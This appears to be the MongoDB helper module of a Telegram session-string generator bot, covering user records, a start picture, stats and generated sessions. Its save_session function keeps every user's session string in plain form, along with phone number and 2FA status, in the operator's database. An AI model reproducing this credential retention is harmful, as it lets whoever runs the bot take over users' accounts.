import logging
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from . import config

client = None
db = None
users = sessions_col = config_col = None

if config.MONGO_URI:
    try:
        client = AsyncIOMotorClient(config.MONGO_URI, serverSelectionTimeoutMS=6000)
        db = client["session_bot"]
        users = db["users"]
        sessions_col = db["sessions"]
        config_col = db["config"]
        logging.info("MongoDB client initialized")
    except Exception as e:
        logging.error(f"MongoDB init failed: {e}")
else:
    logging.warning("MONGO_URI not set — DB features disabled (bot still works)")

def is_enabled():
    return db is not None

async def save_user(user):
    if not is_enabled():
        return
    try:
        await users.update_one(
            {"_id": user.id},
            {
                "$set": {
                    "first_name": user.first_name,
                    "last_name": user.last_name,
                    "username": user.username,
                    "last_seen": datetime.utcnow(),
                },
                "$setOnInsert": {"joined_at": datetime.utcnow()},
            },
            upsert=True,
        )
    except Exception as e:
        logging.error(f"save_user: {e}")

async def save_session(user_id, session_type, session_str, phone, has_2fa):
    if not is_enabled():
        return
    try:
        await sessions_col.insert_one({
            "user_id": user_id,
            "type": session_type,
            "session": session_str,
            "phone": phone,
            "has_2fa": has_2fa,
            "created_at": datetime.utcnow(),
        })
    except Exception as e:
        logging.error(f"save_session: {e}")

async def get_start_pic():
    if not is_enabled():
        return None
    try:
        doc = await config_col.find_one({"_id": "start_pic"})
        return doc.get("file_id") if doc else None
    except Exception as e:
        logging.error(f"get_start_pic: {e}")
        return None

async def set_start_pic(file_id):
    if not is_enabled():
        return False
    try:
        await config_col.update_one(
            {"_id": "start_pic"},
            {"$set": {"file_id": file_id, "updated_at": datetime.utcnow()}},
            upsert=True,
        )
        return True
    except Exception as e:
        logging.error(f"set_start_pic: {e}")
        return False

async def clear_start_pic():
    if not is_enabled():
        return False
    try:
        await config_col.delete_one({"_id": "start_pic"})
        return True
    except Exception as e:
        logging.error(f"clear_start_pic: {e}")
        return False

async def get_stats():
    if not is_enabled():
        return {}
    try:
        total_users = await users.count_documents({})
        total_sessions = await sessions_col.count_documents({})
        today = datetime.utcnow().replace(hour=0, minute=0, second=0, microsecond=0)
        today_sessions = await sessions_col.count_documents({"created_at": {"$gte": today}})
        return {"users": total_users, "sessions": total_sessions, "today": today_sessions}
    except Exception as e:
        logging.error(f"get_stats: {e}")
        return {}
